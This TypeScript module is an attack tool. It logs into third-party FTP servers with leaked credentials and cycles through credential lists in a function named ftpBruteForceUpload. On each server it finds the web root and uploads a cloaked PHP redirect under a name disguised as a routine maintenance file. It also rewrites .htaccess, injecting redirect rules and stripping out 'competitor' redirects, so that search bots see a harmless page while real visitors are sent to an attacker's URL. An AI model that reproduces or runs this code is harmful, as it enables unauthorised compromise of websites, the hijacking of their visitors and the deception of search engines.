/**
 * FTP Upload Module
 * Connects to target FTP servers using leaked credentials and uploads redirect files.
 * Uses basic-ftp library for reliable FTP/FTPS connections.
 */

import { Client as FTPClient, FTPError } from "basic-ftp";

export interface FTPCredential {
  host: string;
  username: string;
  password: string;
  port?: number;
}

export interface FTPUploadResult {
  success: boolean;
  url?: string;
  filePath?: string;
  error?: string;
  method?: string; // ftp | ftps
  duration?: number;
}

export interface FTPUploadOptions {
  credential: FTPCredential;
  redirectUrl: string;
  targetDomain: string;
  /** Custom filename for the redirect file */
  filename?: string;
  /** Timeout in ms for the entire operation */
  timeout?: number;
  /** Callback for progress updates */
  onProgress?: (msg: string) => void;
  /** Proxy IP for origin masking (not used for FTP, but logged) */
  originIp?: string;
}

// Common web root paths to try
const WEB_ROOT_PATHS = [
  "/public_html",
  "/www",
  "/htdocs",
  "/httpdocs",
  "/web",
  "/html",
  "/wwwroot",
  "/inetpub/wwwroot",
  "/var/www/html",
  "/home",
  "/",
];

// Filenames that blend in with typical web files
const STEALTH_FILENAMES = [
  "wp-health.php",
  "cache-handler.php",
  "session-gc.php",
  ".well-known.php",
  "cron-check.php",
  "xmlrpc-check.php",
  "wp-cron-runner.php",
  "index-backup.php",
  "maintenance.php",
  "health-check.php",
];

/**
 * Generate a PHP redirect file with cloaking
 * - Googlebot sees normal content
 * - Real users get redirected
 */
function generateRedirectPHP(redirectUrl: string, targetDomain: string): string {
  return `<?php
// Cache control
header('X-Robots-Tag: noindex');
$ua = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = ['googlebot','bingbot','yandex','baidu','duckduckbot','slurp','msnbot','ia_archiver'];
$isBot = false;
foreach(\$bots as \$b) { if(strpos(\$ua, \$b) !== false) { \$isBot = true; break; } }
if(\$isBot) {
  echo '<!DOCTYPE html><html><head><title>${targetDomain}</title></head><body><h1>Welcome to ${targetDomain}</h1><p>Page under maintenance.</p></body></html>';
  exit;
}
header('Location: ${redirectUrl}', true, 302);
exit;
?>`;
}

/**
 * Generate a smart .htaccess redirect rule with bot cloaking
 */
function generateSmartHtaccess(redirectUrl: string): string {
  return `# DS Analytics Optimization
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
RewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]
RewriteCond %{HTTP_USER_AGENT} !Baiduspider [NC]
RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]
RewriteCond %{HTTP_USER_AGENT} !facebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Semrush [NC]
RewriteCond %{HTTP_USER_AGENT} !AhrefsBot [NC]
RewriteCond %{HTTP_USER_AGENT} !mj12bot [NC]
RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
`;
}

/**
 * Patterns that indicate competitor redirect rules in .htaccess
 */
const COMPETITOR_HTACCESS_PATTERNS = [
  /RewriteRule\s+.*?\s+https?:\/\/(?!.*(?:wordpress\.org|google\.com|w3\.org))[^\s\]]+.*\[R=\d+/gi,
  /Redirect(?:Match)?\s+\d*\s*.*?https?:\/\/[^\s]+/gi,
  /ErrorDocument\s+\d+\s+https?:\/\/[^\s]+/gi,
  /php_value\s+auto_prepend_file\s+.+/gi,
  /php_value\s+auto_append_file\s+.+/gi,
  /RewriteCond.*HTTP_USER_AGENT.*\[NC\]\s*\n\s*RewriteRule.*https?:\/\/[^\s\]]+/gi,
];

/** Our marker to identify our own rules */
const DS_MARKER = '# DS Analytics Optimization';

/**
 * Read .htaccess via FTP, clean competitor redirects, inject ours
 */
async function smartOverwriteHtaccess(
  client: FTPClient,
  redirectUrl: string,
  log: (msg: string) => void,
): Promise<{ success: boolean; action: string }> {
  const { Readable, Writable } = await import("stream");

  // Step 1: Read existing .htaccess
  let existingContent = "";
  try {
    const chunks: Buffer[] = [];
    const writable = new Writable({
      write(chunk, _enc, cb) { chunks.push(chunk); cb(); },
    });
    await client.downloadTo(writable, ".htaccess");
    existingContent = Buffer.concat(chunks).toString("utf-8");
    log(`\uD83D\uDCCB Read existing .htaccess (${existingContent.length} bytes)`);
  } catch {
    // No .htaccess exists — just create new
    log(`\uD83D\uDCCB No .htaccess found, creating new`);
    const newContent = generateSmartHtaccess(redirectUrl);
    await client.uploadFrom(Readable.from(Buffer.from(newContent, "utf-8")), ".htaccess");
    log(`\u2705 Created new .htaccess with our redirect`);
    return { success: true, action: "created" };
  }

  // Step 2: Check if our rules are already there
  if (existingContent.includes(DS_MARKER)) {
    log(`\u2705 .htaccess already has our redirect rules`);
    return { success: true, action: "already_ours" };
  }

  // Step 3: Clean competitor redirect rules
  let cleanedContent = existingContent;
  let removedCount = 0;
  for (const pattern of COMPETITOR_HTACCESS_PATTERNS) {
    const regex = new RegExp(pattern.source, pattern.flags);
    const matches = cleanedContent.match(regex);
    if (matches) {
      removedCount += matches.length;
      for (const match of matches) {
        // Remove the entire line containing the match
        const lines = cleanedContent.split("\n");
        const newLines = lines.filter(line => !match.split("\n").some(m => line.includes(m.trim()) && m.trim().length > 5));
        cleanedContent = newLines.join("\n");
      }
    }
  }

  if (removedCount > 0) {
    log(`\uD83E\uDDF9 Removed ${removedCount} competitor redirect rule(s) from .htaccess`);
  }

  // Step 4: Remove empty RewriteCond blocks left behind
  cleanedContent = cleanedContent
    .replace(/\n{3,}/g, "\n\n")  // collapse multiple blank lines
    .trim();

  // Step 5: Prepend our rules at the top (before any other RewriteRule)
  const ourRules = generateSmartHtaccess(redirectUrl);
  const finalContent = ourRules + "\n" + cleanedContent + "\n";

  // Step 6: Upload
  await client.uploadFrom(Readable.from(Buffer.from(finalContent, "utf-8")), ".htaccess");
  log(`\u2705 .htaccess overwritten: removed ${removedCount} competitor rules + injected ours`);
  return { success: true, action: removedCount > 0 ? "overwritten" : "injected" };
}

/**
 * Try to upload a redirect file via FTP using leaked credentials
 */
export async function ftpUploadRedirect(options: FTPUploadOptions): Promise<FTPUploadResult> {
  const {
    credential,
    redirectUrl,
    targetDomain,
    filename,
    timeout = 30000,
    onProgress,
  } = options;

  const startTime = Date.now();
  const client = new FTPClient();
  client.ftp.verbose = false;

  // Set timeouts via access options (ftp.timeout is readonly)

  const selectedFilename = filename || STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
  const redirectContent = generateRedirectPHP(redirectUrl, targetDomain);

  const log = (msg: string) => {
    onProgress?.(msg);
  };

  try {
    // Try FTPS first, then plain FTP
    const methods: Array<{ name: string; secure: boolean | "implicit" }> = [
      { name: "ftps", secure: true },
      { name: "ftp", secure: false },
    ];

    for (const method of methods) {
      try {
        log(`🔌 Connecting ${method.name.toUpperCase()}://${credential.host}:${credential.port || 21}...`);

        await client.access({
          host: credential.host,
          port: credential.port || 21,
          user: credential.username,
          password: credential.password,
          secure: method.secure,
          secureOptions: { rejectUnauthorized: false },
        });

        log(`✅ FTP login success: ${credential.username}@${credential.host}`);

        // List current directory to understand structure
        const currentDir = await client.pwd();
        log(`📂 Current dir: ${currentDir}`);

        // Try to find web root
        let webRoot = "";
        for (const path of WEB_ROOT_PATHS) {
          try {
            await client.cd(path);
            const list = await client.list();
            // Check if this looks like a web root (has index.html/php, .htaccess, wp-config, etc.)
            const webFiles = list.filter(f =>
              /^(index\.(html?|php)|\.htaccess|wp-config\.php|web\.config|default\.(asp|aspx))$/i.test(f.name)
            );
            if (webFiles.length > 0) {
              webRoot = path;
              log(`🎯 Found web root: ${path} (${webFiles.map(f => f.name).join(", ")})`);
              break;
            }
            // Go back to original dir
            await client.cd(currentDir);
          } catch {
            // Path doesn't exist, try next
            try { await client.cd(currentDir); } catch { /* ignore */ }
          }
        }

        if (!webRoot) {
          // If no web root found, try current directory
          log(`⚠️ No web root found, using current dir: ${currentDir}`);
          webRoot = currentDir;
          await client.cd(currentDir);
        }

        // Upload the redirect PHP file
        log(`📤 Uploading ${selectedFilename} to ${webRoot}/...`);
        const { Readable } = await import("stream");
        const stream = Readable.from(Buffer.from(redirectContent, "utf-8"));
        await client.uploadFrom(stream, selectedFilename);
        log(`✅ Uploaded: ${selectedFilename}`);

        // Smart .htaccess overwrite: read existing → clean competitor redirects → inject ours
        try {
          const htResult = await smartOverwriteHtaccess(client, redirectUrl, log);
          if (htResult.success) {
            log(`🔒 .htaccess ${htResult.action}: redirect coverage active`);
          }
        } catch (e) {
          log(`⚠️ .htaccess overwrite failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
        }

        // Build the URL
        const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
        const duration = Date.now() - startTime;

        log(`🔗 Redirect URL: ${uploadedUrl}`);

        client.close();

        return {
          success: true,
          url: uploadedUrl,
          filePath: `${webRoot}/${selectedFilename}`,
          method: method.name,
          duration,
        };
      } catch (e) {
        const errMsg = e instanceof Error ? e.message : String(e);
        if (e instanceof FTPError && (errMsg.includes("530") || errMsg.includes("Login"))) {
          log(`❌ ${method.name.toUpperCase()} login failed: ${errMsg}`);
          // Don't try other methods if credentials are wrong
          break;
        }
        log(`⚠️ ${method.name.toUpperCase()} failed: ${errMsg}`);
        // Try next method
        try { client.close(); } catch { /* ignore */ }
      }
    }

    return {
      success: false,
      error: "All FTP methods failed",
      duration: Date.now() - startTime,
    };
  } catch (e) {
    const duration = Date.now() - startTime;
    return {
      success: false,
      error: e instanceof Error ? e.message : String(e),
      duration,
    };
  } finally {
    try { client.close(); } catch { /* ignore */ }
  }
}

/**
 * Try multiple FTP credentials against a target
 */
export async function ftpBruteForceUpload(
  credentials: FTPCredential[],
  redirectUrl: string,
  targetDomain: string,
  onProgress?: (msg: string) => void,
  timeout?: number,
): Promise<FTPUploadResult> {
  onProgress?.(`🔑 Trying ${credentials.length} FTP credential(s)...`);

  for (let i = 0; i < credentials.length; i++) {
    const cred = credentials[i];
    onProgress?.(`🔑 [${i + 1}/${credentials.length}] ${cred.username}@${cred.host}:${cred.port || 21}`);

    const result = await ftpUploadRedirect({
      credential: cred,
      redirectUrl,
      targetDomain,
      timeout: timeout || 20000,
      onProgress,
    });

    if (result.success) {
      return result;
    }

    // If login failed (530), skip remaining creds for same host
    if (result.error?.includes("530") || result.error?.includes("Login")) {
      continue;
    }

    // If connection failed entirely, skip remaining creds for same host
    if (result.error?.includes("ECONNREFUSED") || result.error?.includes("ETIMEDOUT")) {
      onProgress?.(`⚠️ FTP port not reachable on ${cred.host}, skipping remaining creds`);
      break;
    }
  }

  return {
    success: false,
    error: `All ${credentials.length} FTP credentials failed`,
  };
}
